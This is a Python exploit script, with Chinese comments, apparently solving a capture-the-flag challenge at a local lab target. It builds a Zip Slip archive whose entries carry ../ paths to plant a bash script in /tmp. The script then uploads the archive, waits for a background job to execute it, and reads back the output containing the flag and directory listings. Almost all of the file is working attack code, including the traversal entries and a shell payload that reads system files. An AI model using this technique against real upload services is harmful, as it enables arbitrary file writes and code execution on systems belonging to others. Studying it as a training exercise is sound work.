#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
import os
atexit.register(lambda: print("作者 ZluxYao"))
"""
Q26 · Path Traversal · Zip Slip 任意写
============================================
靶机：http://127.0.0.1:34931/

利用链：
  ① Zip Slip：zip 条目名带 ../ → 解压时穿越到 /tmp/
  ② 题目自带后台周期扫描 /tmp/*.sh 并 bash 执行
  ③ 执行 stdout 被写入 /app/extracted/_output.txt
  ④ /view?name=_output.txt 读取 flag

用法：
  python3 main.py [BASE_URL]
"""

import io
import sys
import time
import zipfile
import requests

os.environ["NO_PROXY"] = "*"  # 防止代理污染：脚本只访问 127.0.0.1

BASE = os.environ.get("GKD_URL") or (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:33670")

# trigger 候选名（黑盒：一把全扔，命中概率最大化）
CANDIDATES = [
    "../../../tmp/ctf_trigger.sh",
    "../../../tmp/trigger.sh",
    "../../../tmp/run.sh",
    "../../../tmp/cron.sh",
    "../../../tmp/ops.sh",
    "../../../tmp/task.sh",
    "../../../tmp/maintain.sh",
    "../../../tmp/exec.sh",
]

# 执行的 shell 脚本：读 flag + 取一些环境信息
PAYLOAD = b"#!/bin/bash\ncat /flag.txt\nid\nls -la /tmp /app\n"


def build_zip() -> bytes:
    """构造 Zip Slip 压缩包（内存中），返回 bytes"""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("readme.txt", b"normal file")  # 一个正常文件，让 zip 看起来合法
        for name in CANDIDATES:
            # 关键：writestr 不会过滤 ../，原样写入中央目录
            z.writestr(name, PAYLOAD)
    return buf.getvalue()


def upload(zip_bytes: bytes) -> dict:
    """上传 zip 到 /upload"""
    r = requests.post(
        f"{BASE}/upload",
        files={"file": ("slip.zip", zip_bytes, "application/zip")},
        timeout=15,
    )
    r.raise_for_status()
    return r.json()


def list_files() -> dict:
    r = requests.get(f"{BASE}/list", timeout=10)
    r.raise_for_status()
    return r.json()


def view(name: str) -> str:
    r = requests.get(f"{BASE}/view", params={"name": name}, timeout=10)
    return r.text


def main():
    print(f"[*] Target: {BASE}")

    # Step 1 · 构造 zip
    zb = build_zip()
    print(f"[+] Built zip-slip archive: {len(zb)} bytes, {len(CANDIDATES)} slip entries")

    # Step 2 · 上传
    resp = upload(zb)
    print(f"[+] Uploaded, id={resp.get('id')}")
    print(f"    files in response: {resp.get('files')}")
    # 服务端 files 里若原样保留 ../ 说明未做 normalize，Slip 成立
    if any(".." in f for f in resp.get("files", [])):
        print("[+] Zip Slip CONFIRMED (entries contain '..')")

    # Step 3 · 等周期扫描触发
    for i in range(15):
        time.sleep(2)
        files = list_files().get("files", [])
        if "_output.txt" in files:
            print(f"[+] _output.txt appeared after ~{(i+1)*2}s")
            break
        print(f"[.] waiting... ({(i+1)*2}s) files={files}")
    else:
        print("[-] _output.txt 一直没出现，可能 trigger 名都没命中，调整 CANDIDATES")
        return

    # Step 4 · 读 flag
    out = view("_output.txt")
    print("\n========== _output.txt ==========")
    print(out)
    print("=================================")

    # 提取 flag
    for line in out.splitlines():
        if "flag{" in line or "FLAG{" in line.lower():
            print(f"\n🎯 FLAG = {line.strip()}")
            return


if __name__ == "__main__":
    main()
